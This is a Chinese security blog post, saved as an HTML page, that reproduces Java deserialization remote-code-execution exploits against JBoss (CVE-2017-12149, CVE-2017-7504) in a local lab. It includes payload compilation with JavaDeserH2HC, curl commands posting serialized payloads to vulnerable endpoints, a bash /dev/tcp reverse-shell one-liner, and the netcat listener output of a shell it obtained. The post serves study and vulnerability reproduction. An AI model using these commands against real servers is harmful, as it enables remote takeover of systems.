@@ -1,0 +1,797 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next mist use-motion" lang="">
+<head>
+  <meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />
+
+<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css" />
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.4">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="Jboss," />
+
+
+
+
+
+
+
+
+
+
+<meta name="description" content="Jboss漏洞学习。">
+<meta name="keywords" content="Jboss">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Jboss 漏洞学习">
+<meta property="og:url" content="http://yoursite.com/2018/03/30/Jboss/index.html">
+<meta property="og:site_name" content="Sec-note">
+<meta property="og:description" content="Jboss漏洞学习。">
+<meta property="og:locale" content="default">
+<meta property="og:image" content="http://opmi2ydgh.bkt.clouddn.com//18-3-30/58007108.jpg">
+<meta property="og:updated_time" content="2018-04-03T02:35:52.000Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="Jboss 漏洞学习">
+<meta name="twitter:description" content="Jboss漏洞学习。">
+<meta name="twitter:image" content="http://opmi2ydgh.bkt.clouddn.com//18-3-30/58007108.jpg">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Mist',
+    version: '5.1.4',
+    sidebar: {"position":"left","display":"hide","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: 'Author'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="http://yoursite.com/2018/03/30/Jboss/"/>
+
+
+
+
+
+  <title>Jboss 漏洞学习 | Sec-note</title>
+  
+
+
+
+
+
+
+
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="default">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/"  class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">Sec-note</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle"></p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
+            
+            Home
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br />
+            
+            Tags
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-categories">
+          <a href="/categories/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-th"></i> <br />
+            
+            Categories
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />
+            
+            Archives
+          </a>
+        </li>
+      
+
+      
+    </ul>
+  
+
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/03/30/Jboss/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Sec-note">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Sec-note">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">Jboss 漏洞学习</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Posted on</span>
+              
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2018-03-30T18:13:23+08:00">
+                2018-03-30
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">In</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/安全研究/" itemprop="url" rel="index">
+                    <span itemprop="name">安全研究</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <p><code>Jboss</code>漏洞学习。</p>
+<a id="more"></a>
+<h4 id="Jboss-漏洞学习"><a href="#Jboss-漏洞学习" class="headerlink" title="Jboss 漏洞学习"></a>Jboss 漏洞学习</h4><p>复现一下其中的漏洞，然后学习一下其中的原理。</p>
+<h4 id="jboss下载"><a href="#jboss下载" class="headerlink" title="jboss下载"></a><a href="http://jbossas.jboss.org/downloads" target="_blank" rel="noopener">jboss下载</a></h4><p>首先下载环境，根据对应的漏洞下载合适的版本进行测试。</p>
+<h4 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h4><p>1:在<code>run.bat</code>文件中，第一行进行编辑，添加。</p>
+<pre><code>--&quot;set JAVA_HOME=E:\Java\jdk1.7.0_45&quot;(JDK安装目录)
+</code></pre><p>2: 修改<code>Jboss</code>的端口</p>
+<p><code>\server\default\deploy\jbossweb.sar\server.xml</code>。</p>
+<p>修改端口号。</p>
+<pre><code>&lt;!-- A HTTP/1.1 Connector on port 8080 --&gt;
+ &lt;Connector protocol=&quot;HTTP/1.1&quot; port=&quot;12149&quot; address=&quot;${IP}&quot; 
+    redirectPort=&quot;${jboss.web.https.port}&quot; /&gt;
+</code></pre><p>访问<code>127.0.0.1:12149</code>，即可看到页面。</p>
+<p><img src="http://opmi2ydgh.bkt.clouddn.com//18-3-30/58007108.jpg" alt=""></p>
+<h4 id="Jenkins-“Java-反序列化”过程远程命令执行漏洞-CVE-2015-8103"><a href="#Jenkins-“Java-反序列化”过程远程命令执行漏洞-CVE-2015-8103" class="headerlink" title="Jenkins “Java 反序列化”过程远程命令执行漏洞 CVE-2015-8103"></a><a href="https://jenkins.io/security/advisory/2015-11-11/#remote-code-execution-vulnerability-due-to-unsafe-deserialization-in-jenkins-remoting" target="_blank" rel="noopener">Jenkins “Java 反序列化”过程远程命令执行漏洞 CVE-2015-8103</a></h4><h4 id="JBOSSAS-5-x-6-x-反序列化命令执行漏洞-CVE-2017-12149"><a href="#JBOSSAS-5-x-6-x-反序列化命令执行漏洞-CVE-2017-12149" class="headerlink" title="JBOSSAS 5.x/6.x 反序列化命令执行漏洞 CVE-2017-12149"></a><a href="https://mp.weixin.qq.com/s/zUJMt9hdGoz1TEOKy2Cgdg" target="_blank" rel="noopener">JBOSSAS 5.x/6.x 反序列化命令执行漏洞 CVE-2017-12149</a></h4><p><a href="https://github.com/frohoff/ysoserial" target="_blank" rel="noopener">工具1</a><br><a href="https://github.com/joaomatosf/JavaDeserH2HC" target="_blank" rel="noopener">工具2</a></p>
+<p>使用工具2：</p>
+<p><strong>1:编译预置payload的java文件</strong></p>
+<pre><code>javac -cp .:commons-collections-3.2.1.jar ReverseShellCommonsCollectionsHashMap.java
+</code></pre><p><strong>2:反弹shell的IP和端口</strong></p>
+<pre><code>java -cp .:commons-collections-3.2.1.jar  ReverseShellCommonsCollectionsHashMap 192.168.145.154 1234
+</code></pre><p>设置监听端口，nc命令学会使用。</p>
+<pre><code>root@kali:~# nc -vv -l -p 1234
+listening on [any] 1234 ...
+connect to [192.168.145.154] from localhost [192.168.145.1] 10244
+</code></pre><p><strong>3:使用curl向/invoker/readonly提交payload</strong></p>
+<pre><code>curl http://192.168.86.194:12149/invoker/readonly --data-binary @ReverseShellCommonsCollectionsHashMap.ser
+</code></pre><p><strong>反弹shell</strong></p>
+<pre><code>root@kali:~# nc -vv -l -p 1234
+listening on [any] 1234 ...
+connect to [192.168.145.154] from localhost [192.168.145.1] 10244
+Microsoft Windows [�汾 6.1.7601]
+��Ȩ���� (c) 2009 Microsoft Corporation����������Ȩ����
+
+E:\Download\jboss600\bin&gt;ls
+ls
+
+E:\Download\jboss600\bin&gt;dir
+dir
+ ������ E �еľ��� �ĵ�
+ �������к��� 000D-D35E
+</code></pre><p><strong>抓包</strong></p>
+<h4 id="JBOSSAS-4-x-反序列化命令执行漏洞-CVE-2017-7504"><a href="#JBOSSAS-4-x-反序列化命令执行漏洞-CVE-2017-7504" class="headerlink" title="JBOSSAS 4.x 反序列化命令执行漏洞 CVE-2017-7504"></a><a href="https://www.seebug.org/vuldb/ssvid-96881" target="_blank" rel="noopener">JBOSSAS 4.x 反序列化命令执行漏洞 CVE-2017-7504</a></h4><p><a href="https://www.youtube.com/watch?v=jVMr4eeJ2Po" target="_blank" rel="noopener">PoC CVE-2017-7504 - JBossMQ JMS Invocation Layer</a></p>
+<p>步骤以下，但是<code>JBoss4.2.3</code>没有成功。</p>
+<pre><code>root@kali:~/JavaDeserH2HC# javac -cp .:commons-collections-3.2.1.jar ExampleCommonsCollections1.java
+
+监听端口
+root@kali:~# nc -vv -l -p 2345
+listening on [any] 2345 ...
+
+root@kali:~/JavaDeserH2HC# java -cp .:commons-collections-3.2.1.jar ExampleCommonsCollections1 &apos;/bin/bash -i&gt;&amp;/dev/tcp/192.168.145.154/2345&lt;&amp;1&apos;
+
+root@kali:~/JavaDeserH2HC# curl http://192.168.86.194:7504/jbossmq-httpil/HTTPServerILServlet --data-binary @ExampleCommonsCollections1.ser
+</code></pre><h4 id="序列化资料集锦"><a href="#序列化资料集锦" class="headerlink" title="序列化资料集锦"></a>序列化资料集锦</h4><p><a href="http://cb.drops.wiki/drops/papers-178.html" target="_blank" rel="noopener">JBoss安全问题总结</a></p>
+<p><a href="https://frohoff.github.io/appseccali-marshalling-pickles/" target="_blank" rel="noopener">how deserializing objects will ruin your day</a></p>
+<p><a href="http://ph0rse.me/2018/02/04/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%B5%8B%E8%AF%95%E5%A4%87%E5%BF%98%E5%BD%95/" target="_blank" rel="noopener">Java反序列化测试备忘录</a></p>
+<p><a href="https://github.com/joaomatosf/JavaDeserH2HC/" target="_blank" rel="noopener">Lab for Java Deserialization Vulnerabilities</a></p>
+<p><a href="https://www.youtube.com/watch?v=jVMr4eeJ2Po" target="_blank" rel="noopener">PoC CVE-2017-7504 - JBossMQ JMS Invocation Layer</a></p>
+<p><a href="https://foxglovesecurity.com/2015/11/06/what-do-weblogic-websphere-jboss-jenkins-opennms-and-your-application-have-in-common-this-vulnerability/#jenkins" target="_blank" rel="noopener">What Do WebLogic, WebSphere, JBoss, Jenkins, OpenNMS, and Your Application Have in Common? </a></p>
+<p><a href="https://www.seebug.org/vuldb/ssvid-89723" target="_blank" rel="noopener">JBoss “Java 反序列化”过程远程命令执行漏洞</a></p>
+<p><a href="https://paper.seebug.org/312/" target="_blank" rel="noopener">深入理解 JAVA 反序列化漏洞</a></p>
+
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/Jboss/" rel="tag"># Jboss</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2018/03/28/sqlmap_tamper/" rel="next" title="SQLMAP tamper 学习">
+                <i class="fa fa-chevron-left"></i> SQLMAP tamper 学习
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/2018/04/08/java_发序列化/" rel="prev" title="Java 反序列化">
+                Java 反序列化 <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            Table of Contents
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            Overview
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <p class="site-author-name" itemprop="name">Sec-note</p>
+              <p class="site-description motion-element" itemprop="description"></p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives/">
+              
+                  <span class="site-state-item-count">60</span>
+                  <span class="site-state-item-name">posts</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-categories">
+                <a href="/categories/index.html">
+                  <span class="site-state-item-count">12</span>
+                  <span class="site-state-item-name">categories</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-tags">
+                <a href="/tags/index.html">
+                  <span class="site-state-item-count">22</span>
+                  <span class="site-state-item-name">tags</span>
+                </a>
+              </div>
+            
+
+          </nav>
+
+          
+
+          
+            <div class="links-of-author motion-element">
+                
+                  <span class="links-of-author-item">
+                    <a href="https://github.com/sie504" target="_blank" title="GitHub">
+                      
+                        <i class="fa fa-fw fa-github"></i>GitHub</a>
+                  </span>
+                
+            </div>
+          
+
+          
+          
+
+          
+          
+
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-4"><a class="nav-link" href="#Jboss-漏洞学习"><span class="nav-number">1.</span> <span class="nav-text">Jboss 漏洞学习</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#jboss下载"><span class="nav-number">2.</span> <span class="nav-text">jboss下载</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#环境搭建"><span class="nav-number">3.</span> <span class="nav-text">环境搭建</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Jenkins-“Java-反序列化”过程远程命令执行漏洞-CVE-2015-8103"><span class="nav-number">4.</span> <span class="nav-text">Jenkins “Java 反序列化”过程远程命令执行漏洞 CVE-2015-8103</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#JBOSSAS-5-x-6-x-反序列化命令执行漏洞-CVE-2017-12149"><span class="nav-number">5.</span> <span class="nav-text">JBOSSAS 5.x/6.x 反序列化命令执行漏洞 CVE-2017-12149</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#JBOSSAS-4-x-反序列化命令执行漏洞-CVE-2017-7504"><span class="nav-number">6.</span> <span class="nav-text">JBOSSAS 4.x 反序列化命令执行漏洞 CVE-2017-7504</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#序列化资料集锦"><span class="nav-number">7.</span> <span class="nav-text">序列化资料集锦</span></a></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2018</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Sec-note</span>
+
+  
+</div>
+
+
+  <div class="powered-by">Powered by <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a></div>
+
+
+
+  <span class="post-meta-divider">|</span>
+
+
+
+  <div class="theme-info">Theme &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Mist</a> v5.1.4</div>
+
+
+
+
+        
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>
+
+
+
+  
+  
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+</body>
+</html>
